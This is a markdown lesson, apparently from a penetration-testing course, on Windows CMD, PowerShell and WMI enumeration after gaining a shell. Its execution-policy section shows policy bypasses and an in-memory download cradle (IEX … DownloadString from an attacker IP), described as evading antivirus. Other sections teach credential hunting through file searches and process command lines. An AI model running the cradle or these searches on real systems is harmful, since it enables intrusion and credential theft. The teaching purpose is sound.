@@ -1,0 +1,273 @@
+## The Mindset
+
+On Windows you'll work through one of several interfaces depending on how you got your shell. Each has strengths:
+
+- **CMD** — the classic command prompt. Limited, but present everywhere and great for quick enumeration
+- **PowerShell** — the powerful one. Full access to .NET, WMI, and the entire system. This is where serious work happens
+- **WMI** — not a shell but an interface into nearly every aspect of the system, queryable from both CMD (`wmic`) and PowerShell
+
+---
+
+## CMD — The Command Prompt
+
+The traditional interpreter. You'll often get a CMD shell first from an exploit, then upgrade to PowerShell.
+
+### Core Commands
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Where am I?
+cd
+
+# What's here? (with hidden files)
+dir /a
+
+# Who am I and what can I do?
+whoami /all
+
+# Network config
+ipconfig /all
+
+# Active connections and listening ports
+netstat -ano
+
+# Current users
+net user
+
+# Local groups
+net localgroup
+
+# Members of the Administrators group
+net localgroup administrators
+
+# Find text in command output (Windows equivalent of grep)
+ipconfig | findstr "IPv4"
+netstat -ano | findstr "LISTENING"
+```
+
+### `findstr` — The Windows grep
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Case-insensitive search
+netstat -ano | findstr /i "listening"
+
+# Search for a pattern in files recursively
+findstr /s /i "password" *.txt *.ini *.config
+
+# Search with regex
+findstr /r "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" file.txt
+```
+
+| Flag | Meaning                              |
+| ---- | ------------------------------------ |
+| `/i` | Case-insensitive                     |
+| `/s` | Recurse subdirectories               |
+| `/r` | Treat search string as a regex       |
+| `/v` | Invert — show lines that DON'T match |
+| `/n` | Show line numbers                    |
+
+---
+
+## PowerShell — The Real Tool
+
+PowerShell is object-oriented (commands return objects, not just text) and gives you full access to the system. This is where you do credential hunting, enumeration scripts, and most offensive tooling.
+
+### Cmdlet Naming — Verb-Noun
+
+PowerShell commands follow a `Verb-Noun` pattern, which makes them discoverable:
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+Get-Process        # retrieve running processes
+Get-Service        # retrieve services
+Get-ChildItem      # list directory contents
+Set-ExecutionPolicy # change a setting
+Stop-Process       # terminate a process
+```
+
+### Common Aliases
+
+PowerShell aliases many cmdlets to familiar CMD and Linux commands, so muscle memory carries over:
+
+| Alias              | Cmdlet          | Comes From  |
+| ------------------ | --------------- | ----------- |
+| `ls`, `dir`, `gci` | `Get-ChildItem` | Linux / CMD |
+| `cat`, `type`      | `Get-Content`   | Linux / CMD |
+| `cd`, `chdir`      | `Set-Location`  | Both        |
+| `cp`, `copy`       | `Copy-Item`     | Linux / CMD |
+| `rm`, `del`        | `Remove-Item`   | Linux / CMD |
+| `ps`               | `Get-Process`   | Linux       |
+| `pwd`              | `Get-Location`  | Linux       |
+| `echo`             | `Write-Output`  | Both        |
+
+### Discovery — Finding What You Need
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Find all cmdlets with "network" in the name
+Get-Command *network*
+
+# Find commands by verb
+Get-Command -Verb Get
+
+# Get help and examples for a cmdlet
+Get-Help Get-Process -Examples
+
+# See all properties and methods of an object
+Get-Process | Get-Member
+```
+
+<Tip>
+  `Get-Member` is your best friend in PowerShell. Pipe any object into it to see
+  every property and method available — that's how you discover what data you
+  can extract from a command's output.
+</Tip>
+
+### Pipeline & Filtering
+
+Because PowerShell passes objects, you filter on properties, not text:
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Filter objects by a property value
+Get-Process | Where-Object { $_.CPU -gt 100 }
+
+# Select specific properties
+Get-Process | Select-Object Name, Id, CPU
+
+# Sort by a property
+Get-Process | Sort-Object CPU -Descending
+
+# Count results
+(Get-Process).Count
+
+# Combine — top 5 processes by memory
+Get-Process | Sort-Object WS -Descending | Select-Object -First 5 Name, WS
+```
+
+---
+
+## Execution Policy
+
+PowerShell's execution policy restricts which scripts can run. It's **not a security boundary** — it's trivial to bypass, and you'll need to when running enumeration scripts.
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Check the current policy
+Get-ExecutionPolicy
+
+# Restricted = no scripts can run (default on clients)
+```
+
+**Bypassing it (several ways, none require admin):**
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Bypass for a single script invocation
+powershell -ExecutionPolicy Bypass -File .\script.ps1
+
+# Bypass for the current process only (no admin needed)
+Set-ExecutionPolicy Bypass -Scope Process
+
+# Pipe the script into PowerShell (sidesteps policy entirely)
+Get-Content .\script.ps1 | powershell -NoProfile -
+
+# Download and run in memory (never touches disk)
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/script.ps1')
+```
+
+<Tip>
+  `IEX (New-Object Net.WebClient).DownloadString(...)` is the classic "download
+  cradle" — it pulls a script from your machine and runs it directly in memory,
+  leaving nothing on disk for AV to scan. The modern equivalent uses
+  `Invoke-RestMethod` (`irm`).
+</Tip>
+
+---
+
+## WMI — Windows Management Instrumentation
+
+WMI is an interface to almost every part of the system — hardware, OS, processes, services, installed software. You query it when you need detailed system info, and it's available from both CMD and PowerShell.
+
+### From CMD — `wmic`
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Installed patches (Quick Fix Engineering)
+wmic qfe
+
+# Running processes with full command lines
+wmic process get name,processid,commandline
+
+# Installed software
+wmic product get name,version
+
+# Service details including the binary path
+wmic service get name,startname,pathname,startmode
+
+# Local user accounts
+wmic useraccount get name,sid
+```
+
+<Tip>
+  `wmic process get ...,commandline` is a credential-hunting goldmine — just
+  like `ps aux` on Linux, processes often have passwords passed as command-line
+  arguments, and this shows them.
+</Tip>
+
+### From PowerShell — `Get-WmiObject` / `Get-CimInstance`
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# OS version and build
+Get-WmiObject -Class Win32_OperatingSystem | Select-Object Version, BuildNumber
+
+# Services with their executable paths
+Get-WmiObject -Class Win32_Service | Select-Object Name, StartName, PathName, StartMode
+
+# Processes with command lines
+Get-WmiObject -Class Win32_Process | Select-Object Name, ProcessId, CommandLine
+
+# Installed software
+Get-WmiObject -Class Win32_Product | Select-Object Name, Version
+
+# Logged-on users
+Get-WmiObject -Class Win32_LoggedOnUser
+```
+
+<Tip>
+  `Get-WmiObject` is deprecated in favor of `Get-CimInstance` (same syntax, swap
+  the cmdlet name). Use `Get-CimInstance` on modern systems, but know
+  `Get-WmiObject` for older boxes where the newer cmdlet may behave differently.
+</Tip>
+
+---
+
+## Quick Reference
+
+### CMD
+
+| Command                       | Purpose                         |
+| ----------------------------- | ------------------------------- |
+| `whoami /all`                 | Full user/privilege/group dump  |
+| `ipconfig /all`               | Network configuration           |
+| `netstat -ano`                | Connections and listening ports |
+| `net user` / `net localgroup` | Users and groups                |
+| `findstr /s /i "password" *`  | Search files for a string       |
+
+### PowerShell
+
+| Command                                     | Purpose                        |
+| ------------------------------------------- | ------------------------------ |
+| `Get-Command *keyword*`                     | Discover cmdlets               |
+| `... \| Get-Member`                         | Inspect an object's properties |
+| `... \| Where-Object {...}`                 | Filter by property             |
+| `... \| Select-Object prop`                 | Pick properties                |
+| `Get-ExecutionPolicy`                       | Check script policy            |
+| `Set-ExecutionPolicy Bypass -Scope Process` | Bypass policy (no admin)       |
+
+### WMI
+
+| Command                                    | Purpose                            |
+| ------------------------------------------ | ---------------------------------- |
+| `wmic qfe`                                 | Installed patches                  |
+| `wmic process get name,commandline`        | Processes + command lines (creds!) |
+| `wmic service get name,pathname,startname` | Service binary paths               |
+| `Get-WmiObject Win32_OperatingSystem`      | OS version                         |
+| `Get-CimInstance Win32_Service`            | Services (modern)                  |
+
+---
+
+_Next: [Processes & Services](/tech/windows/processes-services) — finding running processes, abusing service misconfigurations, and dumping credentials from memory._
